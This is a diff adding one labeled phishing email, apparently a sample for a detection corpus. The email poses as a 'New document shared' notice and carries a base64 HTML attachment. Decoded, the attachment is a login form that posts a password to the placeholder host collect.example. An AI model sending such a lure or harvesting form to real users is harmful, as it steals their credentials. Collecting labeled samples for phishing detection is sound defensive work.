@@ -1,0 +1,25 @@
+X-Corpus-Class: phishing
+X-Corpus-Lang: en
+X-Corpus-Auth: spf=none dkim=none dmarc=none
+X-Corpus-Sender: unknown
+X-Corpus-Note: login page as HTML attachment
+From: Scan Service <scanner@docs-share.example>
+To: Max Muster <max@uwu.example>
+Subject: New document shared with you
+Date: Tue, 15 Sep 2026 02:25:00 +0000
+Message-ID: <078186484976.488@docs-share.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="mix-4273623839"
+
+--mix-4273623839
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+Open the attached document and sign in to view it.
+--mix-4273623839
+Content-Type: text/html; name="document.html"
+Content-Disposition: attachment; filename="document.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGZvcm0gYWN0aW9uPSdodHRwczovL2NvbGxlY3QuZXhhbXBsZS9wJz48aW5wdXQgbmFtZT0ncGFzc3dvcmQnPjwvZm9ybT48L2h0bWw+
+--mix-4273623839--
